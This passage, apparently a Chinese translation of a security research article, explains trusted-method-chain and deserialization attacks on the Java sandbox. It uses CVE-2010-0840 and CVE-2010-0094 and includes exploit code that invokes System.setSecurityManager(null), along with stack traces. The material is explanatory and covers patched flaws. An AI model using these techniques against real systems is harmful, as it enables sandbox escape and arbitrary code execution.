原文：
在上一篇文章中，我们为读者详细介绍了实例未初始化漏洞，在本文中，我们将为读者介绍最后两种漏洞，即受信任的方法链攻击和序列化漏洞。
**\----[ 4.3 - 受信任的方法链攻击**
* * *
**\------[ 4.3.1 - 背景知识**
* * *
在Java中，每当进行安全检测时，都会检查整个调用堆栈。其中，调用堆栈中的每一帧都含有一个方法名，并且该方法名称是由相关的类和方法的签名进行标识的。受信任的方法链攻击背后的原理是，让调用堆栈上只有受信任的类。为此，通常要求攻击者通过受信任的类中的反射特性来调用目标方法。这样的话，当安全检查完成，并且目标方法在特权上下文中运行时（通常为了禁用安全管理器），调用堆栈上就不会有应用程序类（这些类都是不受信任的）。为了使这种方法行之有效，该方法链必须位于特权线程上，例如事件线程。不过，该方法链不能用于主线程，因为具有main方法的类被认为是不可信的，因此，安全检查将会抛出异常。
**\------[ 4.3.2 - 示例 : CVE-2010-0840**
* * *
这个漏洞是针对Java平台的第一个受信任的方法链攻击样本[32]。它借助于_java.beans.Statement_类的反射特性来执行目标方法。其中，攻击代码会注入一个
_JList_
GUI元素（“一个显示对象列表并允许用户选择一个或多个选项的组件”，见参考文献[33]）来强制GUI线程绘制新元素。该漏洞利用代码具体如下所示：
    ---------------------------------------------------------------------------         // target method
         Object target = System.class;
         String methodName = "setSecurityManager";
         Object[] args = new Object[] { null };
         Link l = new Link(target, methodName, args);
         final HashSet s = new HashSet();
         s.add(l);
         Map h = new HashMap() {
            public Set entrySet() {
                return s;
            }; };
         sList = new JList(new Object[] { h });
    ---------------------------------------------------------------------------    
通过_Link_对象，目标方法被表示为_Statement_类。需要说明的是，这个_Link_类不是来自JCL，而是由安全分析人员构造的一个类。实际上，_Link_类是_Expression_which的子类，而后者属于_Statement_类的子类。此外，_Link_对象还以弄虚作假的方式实现了_java.util.Map.Entry_interface的getValue()方法。其实，它并没有真正实现_Entry_接口，因为这里只有一个getValue()方法。所以，这种“实现”无法使用普通的javac编译器搞定，而只能通过直接修改_Link_类的字节码来完成。
    ---------------------------------------------------------------------------         interface Entry {
            [...]
            /**
            * Returns the value corresponding to this entry.  If the mapping
            * has been removed from the backing map (by the iterator's
            * remove operation), the results of this call are
            * undefined.
            *
            * @return the value corresponding to this entry
            * @throws IllegalStateException implementations may, but are not
            *         required to, throw this exception if the entry has been
            *         removed from the backing map.
            */
            V getValue();
            [...]
    ---------------------------------------------------------------------------    
如您所见，该接口只是提供了一个getValue()方法。事实上，_Expression_类也有一个具有相同签名的getValue()方法。就是因为这一点，所以，在运行时才能够成功调用_Link_类型的对象的Entry.getValue()，尽管它只是_Entry_的实现的赝品。
    ---------------------------------------------------------------------------         // in AbstractMap
         public String toString() {
            Iterator> i = entrySet().iterator();
            if (! i.hasNext())
                return "{}";
            StringBuilder sb = new StringBuilder();
            sb.append('{');
            for (;;) {
                Entry e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                sb.append(key   == this ? "(this Map)" : key);
                sb.append('=');
                sb.append(value == this ? "(this Map)" : value);
                if (! i.hasNext())
                    return sb.append('}').toString();
                sb.append(',').append(' ');
            }
         }
    ---------------------------------------------------------------------------    
安全分析人员的目的是，通过调用AbstractMap.toString()方法来调用_Link_对象上的Entry.getValue()，进而调用invoke()方法：
    ---------------------------------------------------------------------------         public Object getValue() throws Exception {
            if (value == unbound) {
                setValue(invoke());
            }
            return value;
         }
    ---------------------------------------------------------------------------    
之后，invoke方法通过反射执行安全分析人员的目标方法System.setSecurityManapger（null），从而禁用安全管理器。利用反射特性调用这个方法时，对应的调用堆栈如下所示：
    ---------------------------------------------------------------------------         at java.beans.Statement.invoke(Statement.java:235)
         at java.beans.Expression.getValue(Expression.java:98)
         at java.util.AbstractMap.toString(AbstractMap.java:487)
         at javax.swing.DefaultListCellRenderer.getListCellRendererComponent
            (DefaultListCellRenderer.java:125)
         at javax.swing.plaf.basic.BasicListUI.updateLayoutState
            (BasicListUI.java:1337)
         at javax.swing.plaf.basic.BasicListUI.maybeUpdateLayoutState
            (BasicListUI.java:1287)
         at javax.swing.plaf.basic.BasicListUI.paintImpl(BasicListUI.java:251)
         at javax.swing.plaf.basic.BasicListUI.paint(BasicListUI.java:227)
         at javax.swing.plaf.ComponentUI.update(ComponentUI.java:143)
         at javax.swing.JComponent.paintComponent(JComponent.java:758)
         at javax.swing.JComponent.paint(JComponent.java:1022)
         at javax.swing.JComponent.paintChildren(JComponent.java:859)
         at javax.swing.JComponent.paint(JComponent.java:1031)
         at javax.swing.JComponent.paintChildren(JComponent.java:859)
         at javax.swing.JComponent.paint(JComponent.java:1031)
         at javax.swing.JLayeredPane.paint(JLayeredPane.java:564)
         at javax.swing.JComponent.paintChildren(JComponent.java:859)
         at javax.swing.JComponent.paint(JComponent.java:1031)
         at javax.swing.JComponent.paintToOffscreen(JComponent.java:5104)
         at javax.swing.BufferStrategyPaintManager.paint
            (BufferStrategyPaintManager.java:285)
         at javax.swing.RepaintManager.paint(RepaintManager.java:1128)
         at javax.swing.JComponent._paintImmediately(JComponent.java:5052)
         at javax.swing.JComponent.paintImmediately(JComponent.java:4862)
         at javax.swing.RepaintManager.paintDirtyRegions
            (RepaintManager.java:723)
         at javax.swing.RepaintManager.paintDirtyRegions
            (RepaintManager.java:679)
         at javax.swing.RepaintManager.seqPaintDirtyRegions
            (RepaintManager.java:659)
         at javax.swing.SystemEventQueueUtilities$ComponentWorkRequest.run
            (SystemEventQueueUtilities.java:128)
         at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:209)
         at java.awt.EventQueue.dispatchEvent(EventQueue.java:597)
         at java.awt.EventDispatchThread.pumpOneEventForFilters
            (EventDispatchThread.java:273)
         at java.awt.EventDispatchThread.pumpEventsForFilter
            (EventDispatchThread.java:183)
         at java.awt.EventDispatchThread.pumpEventsForHierarchy
            (EventDispatchThread.java:173)
         at java.awt.EventDispatchThread.pumpEvents
            (EventDispatchThread.java:168)
         at java.awt.EventDispatchThread.pumpEvents
            (EventDispatchThread.java:160)
         at java.awt.EventDispatchThread.run(EventDispatchThread.java:121)
    ---------------------------------------------------------------------------    
可以看到，这个调用堆栈上并没有不受信任的类。所以，无论进行任何安全检查，调用堆栈的元素都能顺利通过。
如上面的调用堆栈所示，绘制操作（`RepaintManager.java:1128`）最终将调用getListCellRendererComponent()方法（`DefaultListCellRenderer.java:125`）。_JList_构造函数的一个参数是将由item元素组成的列表。之后，该方法会调用相关元素的toString()方法。第一个元素是
_Map_
，所以，会对其所有条目调用getValue()方法，而getValue()方法会调用Statement.invoke()方法，后者将通过反射特性来
调用安全分析人员的目标方法。
**\------[ 4.3.3 - 讨论**
* * *
通过修改Statement.invoke()方法，官方已经修复了该漏洞，具体来说，就是在创建_Statement_的代码的_AccessControlContext_中执行反射调用。需要说明的是，该漏洞不适用于最新版本的JRE，因为创建_Statement_does的不受信任的代码没有被赋予任何权限。
**\----[ 4.4 - 序列化**
* * *
**\------[ 4.4.1 - 背景知识**
* * *
Java允许运行时将对象转换为字节流，以便于实现持久性和网络通信。将对象转换为字节序列称为序列化，而将字节流转换为对象的相反过程则称为反序列化。有时候，反序列化过程的某些部分是在特权上下文中完成的。因此，安全分析人员可以利用这一点，具体来说就是通过实例化因缺少权限而通常不允许实例化的对象。一个典型的例子是类
_java.lang.ClassLoader_ 。安全分析人员（总是在没有权限的情况下）通常无法直接实例化_ClassLoader_的子类 _S_
，因为_ClassLoader_的构造函数会检查调用方是否具有CREATE_CLASSLOADER权限。但是，如果他发现了在特权上下文中反序列化_S_的序列化版本的方法的话，最终就可能得到_S_的实例。请注意，_S_的序列化版本可以由攻击范围之外的安全分析人员创建（例如，在他自己的机器上，在没有沙箱的JVM的环境中）。在攻击期间，序列化版本只是表示_S_实例的数据。在本节中，我们将展示如何利用CVE-2010-0094来利用系统代码，该系统代码对特权上下文中安全分析人员提供的数据进行反序列化。利用这种攻击方法，攻击者可执行任意代码，从而绕过所有沙箱限制。
**\------[ 4.4.2 – 示例: CVE-2010-0094**
* * *
漏洞CVE-2010-0094 [35]位于方法RMIConnectionImpl.createMBean(String, ObjectName,
ObjectName, MarshalledObject, String[],
Subject)中。_MarshalledObject_类型的第四个参数包含对象_S_的字节化表示，并且该对象是在特权上下文中进行反序列化的（在具有所有权限的doPrivileged()调用内）。所以，安全分析人员可以通过传递任意对象来创建用于反序列化的MBean()。在这里，传递的是_java.lang.ClassLoader_的子类：
    ---------------------------------------------------------------------------         public class S extends ClassLoader implements Serializable {
         }
    ---------------------------------------------------------------------------    
在易受攻击的JVM版本（例如，1.6.0_17）中，实例化对象_S_时的调用堆栈如下所示：
    ---------------------------------------------------------------------------      1: Thread [main] (Suspended (breakpoint at line 226 in ClassLoader))
      2:    S(ClassLoader).() line: 226 [local variables
                unavailable]
      4:    GeneratedSerializationConstructorAccessor1.newInstance(Object[])
                line: not available
      6:    Constructor.newInstance(Object...) line: 513
      7:    ObjectStreamClass.newInstance() line: 924
      8:    MarshalledObject$MarshalledObjectInputStream
                (ObjectInputStream).readOrdinaryObject(boolean) line: 1737
     10:    MarshalledObject$MarshalledObjectInputStream
                (ObjectInputStream).readObject0(boolean) line: 1329
     12:    MarshalledObject$MarshalledObjectInputStream
                (ObjectInputStream).readObject() line: 351
     14:    MarshalledObject.get() line: 142
     15:    RMIConnectionImpl$6.run() line: 1513
     16:    AccessController.doPrivileged(PrivilegedExceptionAction)
                line: not available [native method]